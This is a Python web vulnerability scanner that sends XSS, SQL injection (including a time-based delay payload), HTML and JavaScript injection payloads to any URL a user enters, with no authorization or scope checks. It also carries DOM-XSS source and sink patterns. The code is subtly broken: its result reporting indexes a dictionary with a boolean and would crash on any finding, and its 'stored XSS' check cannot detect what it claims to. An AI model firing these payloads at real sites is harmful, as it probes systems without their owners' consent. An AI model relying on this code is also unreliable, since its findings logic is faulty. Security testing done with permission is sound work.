
import requests
from bs4 import BeautifulSoup
import logging
import concurrent.futures
import time
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

banner = """
###############################################################
#                   Advanced Vulnerability Hunting Tool        #
#                     Powered by Somasekhara                   #
###############################################################
"""

# Example payloads for different vulnerability types
xss_payloads = ["<script>alert('XSS')</script>", '" onmouseover="alert(\'XSS\')"', '<img src=x onerror="alert(\'XSS\')" />']
sql_payloads = ["' OR 1=1 --", "'; WAITFOR DELAY '00:00:10' --", "' UNION SELECT NULL, NULL, NULL --"]
html_payloads = ["<h1>HTML Injection</h1>", '<iframe src="javascript:alert(\'XSS\');"></iframe>']
js_payloads = ["<script>alert('JavaScript Injection')</script>", '" onload="alert(\'JS Injection\')"']

# Patterns for detecting DOM XSS
dom_xss_patterns = [
    "document.location", "document.write", "document.cookie",
    "window.location", "eval", "innerHTML", "location.href"
]

# Severity levels for each vulnerability type
severity_levels = {
    "Reflected XSS": "P1 - Critical",
    "DOM XSS": "P2 - High",
    "Stored XSS": "P2 - High",
    "SQL Injection": "P1 - Critical",
    "HTML Injection": "P2 - High",
    "JavaScript Injection": "P2 - High"
}

def check_reflected_xss(url):
    for payload in xss_payloads:
        try:
            logger.info(f"Testing for Reflected XSS with payload: {payload}")
            response = requests.get(url, params={"param": payload}, timeout=5)
            if payload in response.text:
                logger.warning(f"{Fore.GREEN}[Reflected XSS] Vulnerability found with payload: {payload}{Style.RESET_ALL}")
                return True
        except requests.RequestException as e:
            logger.error(f"Request failed: {e}")
    return False

def check_dom_xss(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.content, 'html.parser')
        scripts = soup.find_all('script')
        for script in scripts:
            for pattern in dom_xss_patterns:
                if pattern in script.text:
                    logger.warning(f"{Fore.GREEN}[DOM XSS] Pattern found: {pattern}{Style.RESET_ALL}")
                    return True
    except requests.RequestException as e:
        logger.error(f"Request failed: {e}")
    return False

def check_stored_xss(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.content, 'html.parser')
        for payload in xss_payloads:
            if payload in str(soup):
                logger.warning(f"{Fore.GREEN}[Stored XSS] Vulnerability found with payload: {payload}{Style.RESET_ALL}")
                return True
    except requests.RequestException as e:
        logger.error(f"Request failed: {e}")
    return False

def check_sql_injection(url):
    for payload in sql_payloads:
        try:
            logger.info(f"Testing for SQL Injection with payload: {payload}")
            response = requests.get(url, params={"param": payload}, timeout=15)
            if "syntax error" in response.text.lower() or "mysql" in response.text.lower():
                logger.warning(f"{Fore.GREEN}[SQL Injection] Error-based vulnerability found with payload: {payload}{Style.RESET_ALL}")
                return True
            # Blind time-based check
            start_time = time.time()
            response = requests.get(url, params={"param": payload}, timeout=15)
            end_time = time.time()
            if end_time - start_time > 10:
                logger.warning(f"{Fore.GREEN}[SQL Injection] Time-based vulnerability found with payload: {payload}{Style.RESET_ALL}")
                return True
        except requests.RequestException as e:
            logger.error(f"Request failed: {e}")
    return False

def check_html_injection(url):
    for payload in html_payloads:
        try:
            logger.info(f"Testing for HTML Injection with payload: {payload}")
            response = requests.get(url, params={"param": payload}, timeout=5)
            if payload in response.text:
                logger.warning(f"{Fore.GREEN}[HTML Injection] Vulnerability found with payload: {payload}{Style.RESET_ALL}")
                return True
        except requests.RequestException as e:
            logger.error(f"Request failed: {e}")
    return False

def check_js_injection(url):
    for payload in js_payloads:
        try:
            logger.info(f"Testing for JavaScript Injection with payload: {payload}")
            response = requests.get(url, params={"param": payload}, timeout=5)
            if payload in response.text:
                logger.warning(f"{Fore.GREEN}[JavaScript Injection] Vulnerability found with payload: {payload}{Style.RESET_ALL}")
                return True
        except requests.RequestException as e:
            logger.error(f"Request failed: {e}")
    return False

def main():
    print(banner)
    url = input("Enter the URL to test: ").strip()

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        futures.append(executor.submit(check_reflected_xss, url))
        futures.append(executor.submit(check_dom_xss, url))
        futures.append(executor.submit(check_stored_xss, url))
        futures.append(executor.submit(check_sql_injection, url))
        futures.append(executor.submit(check_html_injection, url))
        futures.append(executor.submit(check_js_injection, url))

        for future in concurrent.futures.as_completed(futures):
            if future.result():
                logger.info(f"{Fore.GREEN}Vulnerability check completed with vulnerabilities found: {severity_levels[future.result()]}{Style.RESET_ALL}")
            else:
                logger.info("Vulnerability check completed with no vulnerabilities found.")

if __name__ == "__main__":
    main()
```
